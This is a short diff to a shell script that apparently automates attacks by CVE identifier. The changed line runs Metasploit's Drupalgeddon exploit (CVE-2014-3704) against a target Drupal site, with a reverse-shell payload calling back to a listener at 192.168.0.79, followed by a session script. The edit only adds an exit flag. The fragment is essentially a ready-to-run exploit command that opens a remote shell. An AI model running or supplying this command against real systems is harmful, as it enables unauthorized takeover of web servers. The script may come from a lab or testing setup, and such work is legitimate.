@@ -17,7 +17,7 @@ then
 	echo "exploitabilityScore_V2: 10"
 elif [ $ATTACK == "CVE-2014-3704" ]
 then 
-	msfconsole -q -x "use exploit/multi/http/drupal_drupageddon; set rhost $TARGET; set targeturi /drupal/; set payload php/reverse_perl; set lhost 192.168.0.79; exploit; sessions -i 1 -s command_shell.sh; "
+	msfconsole -q -x "use exploit/multi/http/drupal_drupageddon; set rhost $TARGET; set targeturi /drupal/; set payload php/reverse_perl; set lhost 192.168.0.79; exploit; sessions -i 1 -s command_shell.sh; exit -y"
 	# in command shell run command background and then enter y
         SERVER=$(cat results.txt | cut -d'/' -f 5 | cut -d'.' -f 2)
         rm results.txt
